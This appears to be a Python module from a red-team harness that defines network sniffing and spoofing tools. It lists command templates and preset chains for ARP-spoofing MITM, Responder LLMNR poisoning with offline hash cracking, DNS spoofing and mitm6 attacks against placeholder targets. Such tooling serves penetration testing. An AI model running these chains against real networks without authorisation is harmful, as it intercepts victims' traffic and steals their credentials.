"""
RedTeam Harness — Sniffing & Spoofing Tools Module
Network sniffing, MITM, packet capture, credential harvesting.
"""
from tools.base import BaseTool


class SniffingTools(BaseTool):
    """Network sniffing and spoofing/poisoning tools."""

    def get_tools(self):
        return ["tcpdump_capture", "tshark_capture", "ettercap_mitm",
                "responder_poison", "dsniff_suite", "mitm6_attack"]

    def get_quick_commands(self):
        return [
            {"name": "Capture Interface Traffic", "description": "Capture all traffic on an interface with tcpdump",
             "tool": "tcpdump_capture",
             "args_template": {"interface": "eth0", "count": 1000, "output_file": "capture.pcap"}},
            {"name": "HTTP Traffic Filter", "description": "Capture only HTTP port 80 traffic",
             "tool": "tcpdump_capture",
             "args_template": {"interface": "eth0", "filter": "port 80"}},
            {"name": "TShark Live Capture", "description": "Wireshark CLI packet capture",
             "tool": "tshark_capture",
             "args_template": {"interface": "eth0", "duration": 60}},
            {"name": "ARP Spoof MITM", "description": "Ettercap ARP poisoning attack",
             "tool": "ettercap_mitm",
             "args_template": {"target1": "TARGET_IP", "target2": "GATEWAY_IP", "method": "arp"}},
            {"name": "LLMNR/NBT-NS Poison", "description": "Responder credential harvester",
             "tool": "responder_poison",
             "args_template": {"interface": "eth0"}},
            {"name": "DNS Spoof Attack", "description": "DNS spoofing with dsniff",
             "tool": "dsniff_suite",
             "args_template": {"tool": "dnsspoof", "target": "TARGET_IP"}},
            {"name": "IPv6 MITM Attack", "description": "MITM6 IPv6 DNS spoofing",
             "tool": "mitm6_attack",
             "args_template": {"domain": "corp.local"}},
        ]

    def get_preset_attack_chains(self):
        return [
            {"name": "Credential Harvesting Pipeline",
             "description": "Poison LLMNR/NBT-NS → capture hashes → crack offline",
             "steps": [
                 {"tool": "responder_poison", "args": {"interface": "eth0"}, "description": "Start responder to harvest hashes"},
                 {"tool": "john_crack", "args": {"hash_file": "responder_hashes.txt", "wordlist": "/usr/share/wordlists/rockyou.txt"}, "description": "Crack captured hashes"},
             ]},
            {"name": "Full LAN MITM Pipeline",
             "description": "ARP spoof → sniff traffic → credential extraction",
             "steps": [
                 {"tool": "ettercap_mitm", "args": {"target1": "TARGET_IP", "target2": "GATEWAY_IP", "method": "arp"}, "description": "ARP spoof the target"},
                 {"tool": "tcpdump_capture", "args": {"interface": "eth0", "output_file": "mitm_capture.pcap"}, "description": "Capture all victim traffic"},
                 {"tool": "dsniff_suite", "args": {"tool": "urlsnarf"}, "description": "Extract URLs from captured traffic"},
             ]},
        ]